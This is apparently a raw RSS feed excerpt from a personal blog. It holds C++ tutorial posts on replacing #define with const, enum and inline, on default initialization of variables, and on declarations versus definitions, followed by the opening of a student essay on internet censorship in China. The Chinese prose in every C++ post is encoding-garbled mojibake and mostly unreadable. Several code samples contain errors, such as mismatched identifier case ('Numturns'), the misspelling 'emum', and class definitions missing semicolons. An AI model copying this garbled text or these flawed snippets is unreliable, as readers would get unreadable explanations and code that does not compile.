&lt;p>å½ä½ ä½¿ç¨å°å¶ä¸­çå ç§æ¹å¼çæ¶åï¼è¦ä¹ æ¯å¯¹èªå·±çç¼ç¨æ¹å¼è¿è¡æ´æ¢&lt;/p></description></item><item><title>Book. Effective C++ item2-å°½éä½¿ç¨const, enum, inlineæ¿æ¢#define</title><link>http://www.guozet.me/post/EffectiveC++-item2/</link><pubDate>Tue, 11 Sep 2018 02:09:31 +0000</pubDate><guid>http://www.guozet.me/post/EffectiveC++-item2/</guid><description>&lt;h1 id="introduce">Introduce&lt;/h1>
&lt;p>##å¸¸è§åé&lt;/p>
&lt;p>&lt;code>c++&lt;/code>éé¢ç&lt;code>#define&lt;/code>åé¢çå®ä¹é¨åï¼æ¯ä¸ç®ä»£ç çä¸é¨åçãæä»¥å¦æä½ ä½¿ç¨&lt;code>#define&lt;/code>:&lt;/p>
&lt;p>&lt;code>#define ASPECT_RATIO 1.653&lt;/code>&lt;/p>
&lt;p>ä½ å¸æè¿ä¸ªä»£å·&lt;code>ASPECT RATIO&lt;/code>è¿ä¸ªä»£å·æ¯è½å¤è¢«ç¼è¯å¨å å¥å°è®°å·è¡¨ï¼symbol tableï¼éé¢ï¼å¦æè°è¯çæ¶åï¼è¿ä¸ªé¨ååºç°é®é¢ï¼è½å¤å¾å¿«çåç°åºæ¥ãä½æ¯å¾å¤æ¶åæä»¬çé¢å¤çå¨ä¼æè¿ä¸ªåéç§»é¤ï¼åªä¿çäºä¸ä¸ª&lt;code>1.653&lt;/code>çå¸¸éï¼å¦æDebugçæ¶åè¿ä¸ªå¸¸éåºç°äºéè¯¯ï¼ä½ æ¯å¾é¾å®ä½å°èªå·±éè¦ä¿®æ¹ä»£ç çå°æ¹çï¼è¿å°±ä¼é ææä»¬å¨ä½¿ç¨ä¸­Debugçæ¶åå¾ä¸æ¹ä¾¿ãæä»¬å¯ä»¥ä½¿ç¨å¦å¤çæ¹å¼æ¥å®ä¹&lt;/p>
&lt;pre>&lt;code class="language-cpp">const double AspectRatio = 1.653;
&lt;/code>&lt;/pre>
&lt;p>ä¿®æ¹ä¹åï¼AspectRatioè¿ä¸ªå¸¸éè¯å®ä¼åå¥å°è®°å·è¡¨éé¢ï¼æ¯å¯ä»¥è¢«ç¼è¯å¨æ¾å°çãå¦å¤ä½¿ç¨&lt;code>#define&lt;/code> å¯è½ä¼é ææä»¬çä»£ç éé¢æå¾å¤çobject code ä¸º 1.653, ä½æ¯ä½¿ç¨&lt;code>const&lt;/code>çæ¹å¼ï¼æä»¬çä»£ç éé¢å°±åªä¼æä¸ä¸ª&lt;code>AspectRatio&lt;/code>ã&lt;/p>
&lt;p>å¦ææ¯å¸¸éæé(constant pointers), ç±äºæä»¬çå¸¸éä¸è¬æ¯å®ä¹å¨&lt;code>å¤´æä»¶&lt;/code>ä¸­çï¼æä»¥æä»¬éè¦å°æéå£°æä¸º&lt;code>const&lt;/code>ãå¦ï¼&lt;/p>
&lt;p>&lt;code>const char* const authorName = &amp;quot;Scott Meyers&amp;quot;;&lt;/code>&lt;/p>
&lt;p>è¿éå¯ä»¥ä¿®æ¹ä¸º&lt;code>String&lt;/code>ç±»åï¼ä½¿ç¨Stringæ¥å­å¨å­ç¬¦ä¸²ä¼æ¯&lt;code>char*&lt;/code>æ´å çåéï¼å¯å®ä¹ä¸º&lt;code>const std::string authorName(&amp;quot;Scott Meyers&amp;quot;);&lt;/code>&lt;/p>
&lt;h2 id="classåé¨ä¸å±åé">Classåé¨ä¸å±åé&lt;/h2>
&lt;p>**é®é¢ï¼**éå¶å¸¸éçä½ç¨åæ¯å¨Classåé¨ï¼è¿æ ·å°±è¦å°è¿ä¸ªå¸¸éä½ä¸ºClassçä¸ä¸ªmembeerï¼ è¿æ ·å°±è½å¤ç¡®ä¿è¿ä¸ªå¸¸éè³å¤åªæä¸ä¸ªå®ä½ï¼å¹¶ä¸å¿é¡»å°å¶å£°æä¸º&lt;code>static member&lt;/code>ã&lt;/p>
&lt;pre>&lt;code class="language-cpp">class GamePlayer {
private:
static const int NumTurns = 5; //å¸¸éå£°æ
int scores[NumTurns];
}
&lt;/code>&lt;/pre>
&lt;p>å ä¸ºè¿éé¢&lt;code>static const int NumTurns = 5;&lt;/code>è¿æ¯æ¾å¨ç±»çå£°æéé¢çï¼å¨è¿éå°±æ¯ä¸ä¸ªåéçå£°æï¼å¹¶ä¸æ¯åéçå®ä¹ï¼å¨åå­éé¢æ¯æ²¡æçãä½æ¯c++å¦æä½ å¨å¶ä»å°æ¹å»ä½¿ç¨çè¯ï¼é£æ¯éè¦æä»¬å¯¹è¿ä¸ªè¿è¡åå®ä¹å¨ä½¿ç¨çãå¦æè¦å¨å¶ä»å°æ¹ä½¿ç¨ï¼å°±éè¦æä¾ä¸ä¸ªå®ä¹ï¼&lt;/p>
&lt;p>&lt;code>const int GamePlayer::Numturns;&lt;/code>&lt;/p>
&lt;p>è¿ä¸ªå°±å¯ä»¥æ¾å¨ä½ éè¦ä½¿ç¨&lt;code>GamePlayer::NumTurns&lt;/code>è¿ä¸ªåéçæä»¶éé¢ï¼æ¾å¨&lt;code>*.cpp&lt;/code>æä»¶éï¼èä¸æ¯&lt;code>*.h&lt;/code>æä»¶ä¸­ã&lt;/p>
&lt;p>**æ³¨æ:**ç±äºå¨ç±»çå£°æä¸­å·²ç»ç»&lt;code>GamePlayer::NumTurns&lt;/code>è¿è¡äºèµå¼æä½ï¼æä»¥å¨è¿éåç¬ç´æ¥å®ä¹å°±å¯ä»¥è°ç¨å£°æè¿è¡èµå¼æä½ã&lt;/p>
&lt;p>å¦å¤ä¸ç§éå¯¹èå¼ç¼è¯å¨ä¸æ¯æä¸è¿°è¯­æ³çè§£å³æ¹æ³ï¼&lt;/p>
&lt;pre>&lt;code class="language-cpp">//å¨å¤´æä»¶ä¸­
class CostEstimate {
private:
static const double FudgeFactor; //static class å¸¸éå£°æ
...
}
//å¨å®ç°æä»¶ä¸­å»å
const double CostEstimate::FudgeFactor = 1.35;
&lt;/code>&lt;/pre>
&lt;blockquote>
&lt;p>ä¸é¢è¿ç§æ¹å¼å¯è½é®é¢ï¼classå¨ç¼è¯åºé´éè¦ä¸ä¸ªclassçé¿ä¸¤åªï¼å°±æ¯ç¼è¯å¨ä¸åè®¸&lt;code>static const int a&lt;/code> å®æåå§è®¾å®ï¼è¿æ ·æä»¬å°±è¦ä½¿ç¨å° &lt;code>the enum hack&lt;/code>çæ¹å¼è¿è¡è¡¥å¿ãçè®ºï¼ä¸ä¸ªå±äºenumerated typeçæ°å¼æ¯å¯ä»¥å½æintsæ¥ä½¿ç¨ç&lt;/p>
&lt;/blockquote>
&lt;pre>&lt;code class="language-cpp">class GamePlayer {
private:
enum {NumTurns = 5};
int scores[Numturns];
}
&lt;/code>&lt;/pre>
&lt;p>&lt;strong>è¯´æï¼&lt;/strong> emum hackå®ä¹çåå®¹ï¼æ¯ä¸è½å¤åå°åçï¼åå°åçæä½æ¯ä¸åæ³çï¼èå#defineçå°åä¹æ¯ä¸åæ³çï¼ä½æ¯åä¸ä¸ªconstçå°åæ¯åæ³çãå¦æä¸æ³è®©å¶ä»äººè·å¾è¿ä¸ªpointeræèreferenceæåä½ çæ´æ°åéï¼enumå°±å¯ä»¥å¾å¥½çå®ç°è¿ä¸ªåè½ã&lt;/p>
&lt;p>&lt;code>emum&lt;/code>å&lt;code>#define&lt;/code>æ¯ç»å¯¹ä¸ä¼å¯¼è´éå¿è¦çåå­åéçã&lt;/p>
&lt;h2 id="å®ç°å®å®ä¹">å®ç°å®å®ä¹&lt;/h2>
&lt;p>å®å®ä¹çèµ·æ¥åä¸ä¸ªå½æ°ï¼ä½æ¯ä¸ä¼å¯¼è´å½æ°çè°ç¨å¯¼è´çé¢å¤å¼éï¼æ¯å¦ï¼&lt;/p>
&lt;p>&lt;code>#define CALL_WITH_MAX(a,b) f((a) &amp;gt; (b) ?(a):(b)ï¼&lt;/code>&lt;/p>
&lt;p>é¦åï¼åè¿æ ·çå®å¿é¡»ä¸ºææçå®åé½å ä¸å°æ¬å·ï¼å¦åå¶ä»å°æ¹è°ç¨çæ¶åä¼åºç°é®é¢ãä½å³ä½¿å ä¸äºï¼å¦æä½ å®ç°è¿æ ·çä»£ç ï¼&lt;/p>
&lt;pre>&lt;code class="language-cpp">int a = 5, b = 0;
CALL_WITH_MAX(++a,b);
CALL_WITH_MAX(++a,b+10);
&lt;/code>&lt;/pre>
&lt;p>å¨è°ç¨ä¹åï¼aä¼éå¢ä¹åå¨å»è°ç¨ï¼å¹¶ä¸æ¯å¦éå¢åå³ä¸å®åè°æ¯è¾ã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-11-EffectiveC++-item2/2018-09-12-19-20-59.png" alt="">&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-11-EffectiveC++-item2/2018-09-12-19-21-37.png" alt="">&lt;/p>
&lt;h2 id="å°ç»">å°ç»&lt;/h2>
&lt;ul>
&lt;li>å¯¹äºåçº¯åéï¼ä½¿ç¨constå¯¹è±¡æèenumsæ¿æ¢&lt;code>#define&lt;/code>&lt;/li>
&lt;li>å½¢å¦å½æ°çå®ï¼ä¿®æ¹ä¸ºinlineå½æ°æ¿æ¢#define&lt;/li>
&lt;/ul></description></item><item><title>C++ åéçåå§åé®é¢</title><link>http://www.guozet.me/post/C++-initialization-of-variable/</link><pubDate>Tue, 11 Sep 2018 02:09:31 +0000</pubDate><guid>http://www.guozet.me/post/C++-initialization-of-variable/</guid><description>&lt;h1 id="ä»ç»">ä»ç»&lt;/h1>
&lt;p>å¨C++è¯­è¨ä¸­int a;è¡¨ç¤ºå£°æäºæ´åaä½æªåå§åï¼èC++ä¸­çå¯¹è±¡æ»æ¯ä¼è¢«åå§åçï¼æ è®ºæ¯å¦åäºåæ¬å·æèæ¯å¦åäºåæ°åè¡¨ï¼ä¾å¦ï¼&lt;/p>
&lt;pre>&lt;code class="language-c++">int basic_var; // æªåå§åï¼åºç¨&amp;quot;é»è®¤åå§å&amp;quot;æºå¶
CPerson person; // åå§åï¼ä»¥ç©ºçåæ°åè¡¨è°ç¨æé å½æ°
&lt;/code>&lt;/pre>
&lt;p>åèé¾æ¥ï¼
&lt;a href="https://harttle.land/2015/10/05/cpp-variable-init.html" target="_blank" rel="noopener">C++æç¨¿ï¼åªäºåéä¼èªå¨åå§åï¼&lt;/a>&lt;/p>
&lt;p>&lt;strong>é»è®¤åå§åè§å&lt;/strong>
å®ä¹åºæ¬æ°æ®ç±»ååéï¼åä¸ªå¼ãæ°ç»ï¼çåæ¶å¯ä»¥æå®åå§å¼ï¼å¦ææªæå®C++ä¼å»æ§è¡é»è®¤åå§å(default-initialization)ã é£ä¹ä»ä¹æ¯âé»è®¤åå§åâå¢ï¼&lt;/p>
&lt;ul>
&lt;li>æ ä¸­çåéï¼å½æ°ä½ä¸­çèªå¨åéï¼åå ä¸­çåéï¼å¨æåå­ï¼ä¼ä¿æä¸ç¡®å®çå¼ï¼&lt;/li>
&lt;li>å¨å±åéåéæåéï¼åæ¬å±é¨éæåéï¼ä¼åå§åä¸ºé¶(å®ä»¬å­å¨å¨è¿ç¨çBSSæ®µï¼è¿æ¯å¨é¶çä¸æ®µåå­ç©ºé´ï¼)ã&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>C++11: If no initializer is specified for an object, the object is default-initialized; if no initialization is performed, an ?
object with automatic or dynamic storage duration has indeterminate value. Note: Objects with static or thread storage
duration are zero-initialized, see 3.6.2.&lt;/p>
&lt;/blockquote>
&lt;p>æä»¥å½æ°ä½ä¸­çåéå®ä¹æ¯è¿æ ·çè§åï¼&lt;/p>
&lt;pre>&lt;code class="language-c++">int i; // ä¸ç¡®å®å¼
int i = int(); // 0
int *p = new int; // ä¸ç¡®å®å¼
int *p = new int(); // 0
&lt;/code>&lt;/pre>
&lt;h2 id="å ç§åå§åæåµå¯¹æ¯">å ç§åå§åæåµå¯¹æ¯&lt;/h2>
&lt;h3 id="å¨å±åéå¨å±éæåé-vs-å±é¨åéå±é¨éæåé">å¨å±åé(å¨å±éæåé) Vs å±é¨åé(å±é¨éæåé)&lt;/h3>
&lt;p>å¨å±åéï¼å¨å±éæåéåå±é¨éæåéæ¯å­æ¾å¨BSSæ®µçï¼æä»¥é»è®¤åå§åä¸º &lt;code>0&lt;/code>ãå±é¨åéæ¯å¨æ éé¢ï¼æä»¥åå§åæåµä¸ç¡®å®ã&lt;/p>
&lt;h3 id="ç±»æååéåå§å">ç±»æååéåå§å&lt;/h3>
&lt;p>å¯è§åç½®ç±»åçæååéçâé»è®¤åå§åâè¡ä¸ºåå³äºæå¨å¯¹è±¡çå­å¨ç±»åï¼èå­å¨ç±»åå¯¹åºçé»è®¤åå§åè§åæ¯ä¸åçã æä»¥ä¸ºäºé¿åä¸ç¡®å®çåå¼ï¼éå¸¸ä¼å¨æé å½æ°ä¸­åå§åææåç½®ç±»åçæåã&lt;/p>
&lt;h3 id="åµå¥ç±»çåéåå§å">åµå¥ç±»çåéåå§å&lt;/h3>
&lt;p>è§åè¿æ¯æ¯ä¸æ ·çï¼é»è®¤åå§åè¡ä¸ºåå³äºå®æå±å¯¹è±¡çå­å¨ç±»åãå°é­ç±»ï¼Enclosingï¼ä¸­æåå¯¹è±¡çåç½®ç±»åæååéçâé»è®¤åå§åâè¡ä¸ºåå³äºå½åå°é­ç±»å¯¹è±¡çå­å¨ç±»åï¼èå­å¨ç±»åå¯¹åºçé»è®¤åå§åè§åä»ç¶æ¯ä¸å&lt;/p>
&lt;h2 id="ä»£ç ä¾å­">ä»£ç ä¾å­&lt;/h2>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;iostream&amp;gt;
//1. å¨å±åéä¸éæå¨å±åé
int g_var;
int *g_pointer;
static int g_static;
class A{
public:
int v;
};
class B{
public:
int v;
A a;
};
//2. å¨å±æååé
A class_g_var;
B class_b_g_var;
int main(){
//1. å±é¨åéä¸éæå±é¨åé
int l_var;
int *l_pointer;
static int l_static;
// 2. å·å¤æååé
A class_l_var;
static A class_l_static;
B class_b_l_var;
std::cout&amp;lt;&amp;lt;&amp;quot;--------Global Vs Local Variate---------&amp;quot;&amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;Global Variate: &amp;quot;&amp;lt;&amp;lt; g_var &amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;Global Point: &amp;quot;&amp;lt;&amp;lt; g_pointer &amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;Global Static Variate: &amp;quot;&amp;lt;&amp;lt; g_static &amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;Local Variate: &amp;quot;&amp;lt;&amp;lt; l_var &amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;Local Point: &amp;quot;&amp;lt;&amp;lt; l_pointer &amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;Local Static Variate: &amp;quot;&amp;lt;&amp;lt; l_static &amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;--------Global Vs Local Class Variate---------&amp;quot;&amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;Global Class Variate: &amp;quot;&amp;lt;&amp;lt; class_g_var.v &amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;Local Class Variate: &amp;quot;&amp;lt;&amp;lt; class_l_var.v &amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;Local Static Class variate: &amp;quot;&amp;lt;&amp;lt; class_l_static.v &amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;--------2lGlobal Vs Local Class Variate---------&amp;quot;&amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;Global Class Variate: &amp;quot;&amp;lt;&amp;lt; class_b_g_var.v &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; class_b_g_var.a.v &amp;lt;&amp;lt; std::endl;
std::cout&amp;lt;&amp;lt;&amp;quot;Local Class Variate: &amp;quot;&amp;lt;&amp;lt; class_b_l_var.v &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; class_b_l_var.a.v &amp;lt;&amp;lt;std::endl;
return 0;
};
&lt;/code>&lt;/pre>
&lt;p>&lt;strong>Makefile&lt;/strong>&lt;/p>
&lt;pre>&lt;code class="language-makefile">CXX = g++
# Warnings frequently signal eventual errors:
CXXFLAGS=-g -std=c++11 -W -Wall -Weffc++ -Wextra -pedantic -O0
OBJS = \
main.o
EXEC = run
%.o: %.cpp
$(CXX) $(CXXFLAGS) -c $&amp;lt; -o $@
$(EXEC): $(OBJS)
$(CXX) $(CXXFLAGS) -o $@ $(OBJS) $(LDFLAGS)
main.o: main.cpp
clean:
rm -rf $(OBJS)
rm -rf $(EXEC)
&lt;/code>&lt;/pre></description></item><item><title>C++å£°æä¸å®ä¹çåºå«</title><link>http://www.guozet.me/post/c++-declaration-definition-initialization/</link><pubDate>Tue, 11 Sep 2018 02:09:31 +0000</pubDate><guid>http://www.guozet.me/post/c++-declaration-definition-initialization/</guid><description>&lt;h1 id="introduce">Introduce&lt;/h1>
&lt;h2 id="å£°æ">å£°æ&lt;/h2>
&lt;p>å£°æä¸ä¸ªåéåªæ¯å°åéåæ è¯ç¬¦çæå³ä¿¡æ¯åè¯ç¼è¯å¨ï¼ä½¿ç¼è¯å¨âè®¤è¯âè¯¥æ è¯ç¬¦ï¼ä½å£°æ&lt;code>ä¸ä¸å®å¼èµ·åå­çåé&lt;/code>(æ²¡æåå­åé)ãå£°ææä¸¤ä¸ªä½ç¨ï¼&lt;/p>
&lt;ul>
&lt;li>åè¯ç¼è¯å¨ï¼è¿ä¸ªåå­å·²ç»å¹éå°ä¸ååå­ä¸ï¼ä¸é¢çä»£ç ç¨å°åéæèå¯¹è±¡æ¯å¨å«çå°æ¹å®ä¹çãå£°æå¯ä»¥åºç°å¤æ¬¡ã&lt;/li>
&lt;li>åè¯ç¼è¯å¨ï¼è¿ä¸ªåå­å·²ç»è¢«é¢å®äºï¼å«çå°æ¹åä¹ä¸è½ç¨å®æ¥ä½ä¸ºåéåæå¯¹è±¡åã&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-cpp">class MyClass
{
//æ°æ®æåç»è...
//æåå½æ°ç»è...
};
&lt;/code>&lt;/pre>
&lt;p>ä¸è¿°å£°æä»åè¯ç¼è¯å¨æèªå®ä¹ç±»åMyClass,ç¼è¯å¨ä»å¯¹å¶è¿è¡è¯­æ±åæååå­çå³è®®ï¼å¹¶æªå ç¨åå­!&lt;/p>
&lt;h2 id="å®ä¹">å®ä¹&lt;/h2>
&lt;p>å®ä¹å°±æ¯ï¼ç¼è¯å¨ï¼åå»ºä¸ä¸ªå¯¹è±¡ï¼ä¸ºè¿ä¸ªå¯¹è±¡&lt;code>åéä¸ååå­&lt;/code>ï¼å¹¶ç»å®åä¸ä¸ä¸ªåå­ï¼è¿ä¸ªåå­å°±æ¯å°±æ¯æä»¬ç»å¸¸æè¯´çåéåæå¯¹è±¡åã&lt;/p>
&lt;p>å¨C++ç¨åºä¸­ï¼å¤§å¤æ°æåµä¸åéå£°æä¹å°±æ¯åéå®ä¹ï¼å£°æåéçåæ¶ä¹å°±å®æäºåéçå®ä¹ï¼åªæå£°æå¤é¨åéæ¶ä¾å¤ã&lt;/p>
&lt;p>&lt;strong>å£°æVså®ä¹&lt;/strong>ï¼ æ¯å£°æè¿æ¯å®ä¹ï¼å¤æ­çååæ¯çæ¯å¦å ç¨åå­&lt;/p>
&lt;pre>&lt;code class="language-cpp">class MyClass //ç±»çå£°æï¼æ åå­å æ
{
string myString; //stringçå£°æ
};
&lt;/code>&lt;/pre>
&lt;p>è¿éé¢ç&lt;code>string myString;&lt;/code>å®å¨ç±»çå£°æéé¢ï¼å¹¶æ²¡æå®éç³è¯·åå­ï¼æä»¥è¿å°±æ¯å£°æï¼å ä¸ºå®å¹¶æ²¡æå®éç³è¯·åå­ã&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include&amp;lt;iostream&amp;gt;
//å¨å±ä½ç¨å
string myString;//å®ä¹ï¼myStringæ¯å®ä¾åçstringï¼
int main()
{
//Mainå½æ°ä½å
string myAnotherString;//å®ä¹ï¼myAnotherStringæ¯å®ä¾åçstringï¼
return 0;
}
&lt;/code>&lt;/pre>
&lt;p>è¿éé¢ç&lt;code>string myString;&lt;/code>æ¯å¨å±å®ä¹ï¼å¨å±å¯¹è±¡ä¸å¼å§å°±æ¯è¦ç³è¯·åå­çã&lt;/p>
&lt;p>å°ç»ï¼åéåå¯¹è±¡ä¸å externæ°¸è¿æ¯å®ä¹,ç±»ä¸­çé¤å¤ã å½æ°åªæå½æ°å¤´æ¯å£°æï¼æå½æ°ä½çæ¯å®ä¹ãç±»æ°¸è¿åªæ¯å£°æãç±»æåå½æ°çå½æ°ä½æ¯å®ä¹ã&lt;/p>
&lt;pre>&lt;code class="language-cpp">class MyClass
{
static int x; //è¿éçxæ¯å£°æ
static const int a; //è¿éçaæ¯å£°æ
//éstaticåéå¨ç±»å®ä¾åæ¶æåéåå­.
MyClass();//è¿éçå½æ°æ¯å£°æ
};
int MyClass::x;//è¿æ¯å®ä¹
const int MyClass::a=11;//è¿æ¯å®ä¹
&lt;/code>&lt;/pre>
&lt;pre>&lt;code class="language-cpp">//è¿éçFunæ¯å®ä¹ï¼å ä¸ºæå½æ°ä½
int fun(int a,int b)
{
int c;
c=a+b;
return c;
}
//è¿éçFunæ¯å£°æï¼å ä¸ºè¿éåªæå½æ°å¤´
int fun(int a,int b)ï¼
&lt;/code>&lt;/pre></description></item><item><title>How Internet News Censorship in China Silences the Peopleâs Song</title><link>http://www.guozet.me/post/How-Internet-News-Censorship-in-China-Silences-the-People-Song/</link><pubDate>Mon, 10 Sep 2018 02:09:31 +0000</pubDate><guid>http://www.guozet.me/post/How-Internet-News-Censorship-in-China-Silences-the-People-Song/</guid><description>&lt;p>&lt;strong>How Internet News Censorship in China Silences the Peopleâs Song&lt;/strong>&lt;/p>
&lt;p>This is a thesis when I studied in the ELS.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-10-How-Internet-News-Censorship-in-China-Silences-the-People-Song/2018-09-10-18-34-52.png" alt="">&lt;/p>
&lt;h1 id="introduce">Introduce&lt;/h1>
&lt;p>Last month, my friend Carrier went back to China from the United States after she had been living the United States for more than three years. She complained to me about the Internet in her house but not because of the speed of the Internet. She found that the Google Mail and Facebook were inaccessible when she wanted to access to Google Mail to receive some email from her boss and to contact friends through Facebook. As a computer engineer in China, I have never been puzzled by this since I can use a lot of ways to access to Google or Facebook. Is it challenging to access to Google and Facebook in China? Curiosity pushed me to investigate further. When I asked my parents and some high school classmates about whether they knew how to avert the government blocking access to Google, most of them said that they didnât know how to access to Google in China even though they knew the Google search engine is most famous in the world. After doing some research, I found that blocking Google is only one of many blocking events involving Internet news censorship in China.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-10-How-Internet-News-Censorship-in-China-Silences-the-People-Song/2018-09-10-18-39-39.png" alt="">&lt;/p>
&lt;p>More surprisingly, Google chose to enter the Chinese market in 2005, but Google suddenly announced that they decided to close the office in China in 2010. According to a new approach to China from the Google Official Blog, the officer said, âWe will be discussing with the Chinese government the basis on which we could operate an unfiltered search engine within the law, if at all. We recognize that this may well mean having to shut down Google.cn, and potentially our offices in China.â (2010). Through the history of the world, it is hard to find a company to break up with significant power in public. However, Google did it and closed their offices in China until 2018. The original reason for this matter is that Google received a lot of notifications from Chinese Government to block some websites and block some keywords involving Chinese politics. However, these blocking announcements didnât have any Chinese law to support them. Sometimes, the office just got a phone call to Google to require them to block some information. Are these demands from the Chinese government unreasonable in western culture? Is it difficult to understand why Google couldnât compromise with the Chinese government later? Most western experts believe that Chinese has a severe Internet news censorship to prevent the free spreading through their experience and history (Sorenson, 2013). Nevertheless, using Western values fails to explain why China has a rigorous Internet news censorship without a basic knowledge of Chinese culture and values.&lt;/p>
&lt;p>In the section below, I begin to introduce four types of Internet news censorship. I then point out the reasons why the governments need to build the Internet news censorship system in China and why the citizens donât fight for their freedom on the Internet with the government. I then give the positive and negative about the Chinese censorship policy. Finally, I offer my opinion and conclude.&lt;/p>
&lt;hr>
&lt;h1 id="types-of-internet-news-censorship">Types of Internet News Censorship&lt;/h1>
&lt;p>Nowadays, the Internet news censorship is prevalent in China. How does the Internet censorship work in China? Firstly, we can take the blocking IP as an example. When someone wants to access to the website which is involved in the blocking list of government, the government censorship system will check it and doesnât respond to the user, and it will pass it to deal with next one (King, 2013). As a result, the user canât get the response from the server computer because the connection requirement was cut down by government censorship (King, 2013). Besides, the government built The National Firewall to curb the citizens accessing the news from foreign countries (King, 2013). For example, if you live or work in China, you canât use your computer or smartphone to access to the Youtube or Google websites directly. Also, the government cooperates with big internet and technology companies to ban some news. For example, the government cooperation with Baidu company which is the most significant search engine company in China to block some news which is terrible for some powerful politicians. However, the purpose of the censorship program just helps the government to delete some articles on the Internet. It canât persecute authors. There are some main types of Internet censorship in China.&lt;/p>
&lt;h2 id="non-transparent-censorship">Non-transparent Censorship&lt;/h2>
&lt;h3 id="ambiguous-law">Ambiguous law&lt;/h3>
&lt;p>It is so funny that China doesnât have a clear rule to describe how the Internet censorship system works in China. If you ask The Publicity Department of the Communist Party of China (CCPPD) why the government indicated the Google search must censor the results and remove some issues, they will tell you that Google should filter search results by Chinese laws. But when you ask them about which law these results violated, they just say that the content in these websites endanger the security of the nation, divulges state secrets and disturbs the social order (Sorenson, 2013). However, they canât precisely inform why Google must ban these sites. In fact, there is no a clear law that explains how the Internet News Censorship works (Sorenson, 2013). Besides, sometimes the censorship not only requires internet companies to delete some articles, but it also needs the companies to help the government to spread some government articles and change the search results to the government official website (Sorenson, 2013). Of course, this requirement is also by law even though you will not know this is what law forever.
&lt;img src="http://www.guozet.me/images/in-post/2018-09-10-How-Internet-News-Censorship-in-China-Silences-the-People-Song/2018-09-10-18-35-30.png" alt="">&lt;/p>
&lt;h3 id="enforce-internet-real-name-system">Enforce Internet Real-name system&lt;/h3>
&lt;p>It also causes fear and narrows the freedom of speech on the Internet. Last year, China government revised the Network Information Management law. After that, each person who uses the Internet in China wanted to post some articles on Internet must correspond to his real name and Chinese identity card number. As the implementation of the Internet real-name system, government efficiently managed the peopleâs opinion on the Internet. For example, if someone spread rumors or libelous statements, Chinese police easily find their real name and arrest them because the police can ask the internet company to get the private information of rumormongers.
&lt;img src="http://www.guozet.me/images/in-post/2018-09-10-How-Internet-News-Censorship-in-China-Silences-the-People-Song/2018-09-10-18-36-01.png" alt="">&lt;/p>
&lt;h3 id="the-national-firewall">The National Firewall&lt;/h3>
&lt;p>There are two critical walls in China which are famous in the world. One is Great Wall in the north of China to protect the Chinese citizens in the past. Another is Great Firewall on the internet to constrain the Chinese citizensâ liberalizing. For instance, the government worker said, âThese companies which come from foreign countries are welcome to China, but these companies must follow the law. If you donât accept any Chinese law, then you canât be allowed to built officer in China.â The policy which doesnât allow each foreign companies spread these culture and opinion to Chinese society. It is not difficult to understand, but it bans the freedom in the china. These policies make Chinese people donât know how to judge the events which happened in China. Besides, these policies also cause some people donât have a chance to learn from the international company and their culture. So, this is a wall which let some Chinese people disable in the Mind. It is very dangerous for them. If they canât catch the library in the world, they canât catch up with some foreign countriesâ people in the future.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-10-How-Internet-News-Censorship-in-China-Silences-the-People-Song/2018-09-10-18-37-49.png" alt="">&lt;/p>
&lt;h2 id="complex-censorship-system-to-guide-public-opinion">Complex Censorship System to Guide public opinion&lt;/h2>
&lt;p>In China, Internet news censorship is complicated and methodical. This censorship system looks like an inspection machine. It is working as following steps.&lt;/p>
&lt;p>&lt;strong>Do censorship by themselves&lt;/strong>. Chinese netizens have realized that a lot of words cannot send on the website, like Weibo, QQ. Because when you wrote some sensitive word or title and wanted to post them on a site, you would fail to send these words because the censorship system may notice you about âYour post has some sensitive words, so you can not post it.â. Sometimes, even though you posted this article, but some worker of this website will delete it. However, this system doesnât tell you which words you need to change it. Therefore, Chinese netizens have learned replaced some sensitive words out of the similar words or deleted this part before they post the message. If you live in this situation for a long time, this censorship will make you built a behavior about checking your message before you want to pose it even though there is no censorship anymore. For example, a netizen would publish a message containing âHu Jintaoâ, which was the last president of China. He may use some similar word to replace it because the president name in some websites is the sensitive words and you canât discuss them with some bad news on the site.
&lt;img src="http://www.guozet.me/images/in-post/2018-09-10-How-Internet-News-Censorship-in-China-Silences-the-People-Song/2018-09-10-18-34-04.png" alt="">&lt;/p>
&lt;hr>
&lt;h1 id="strict-internet-news-censorship">Strict Internet News Censorship&lt;/h1>
&lt;p>There is more than one billion Internet population in China (Xu, 2011). Even though a small part of netizens intentionally spread a rumor, it also has a significant influence on society safety and economy. For example, according to the news (December 2003), although there was no one person killed by atypical pneumonia (SARS) in the United States in 2003, panic with the rumor about SARS spread each side in the United States. In fact that no one to listened to the truth and the experts and they didnât believe everyone. They didnât go to the Chinese restaurant and close some Chinese markets because of these rumors. (LEE et al., 2003)If something like this happens in China, this will set off riots nationally even though only twenty percent of the people believe these tales. So, each country needs to build an Internet censorship system stop the rumor spread if they want to quell public panic.&lt;/p>
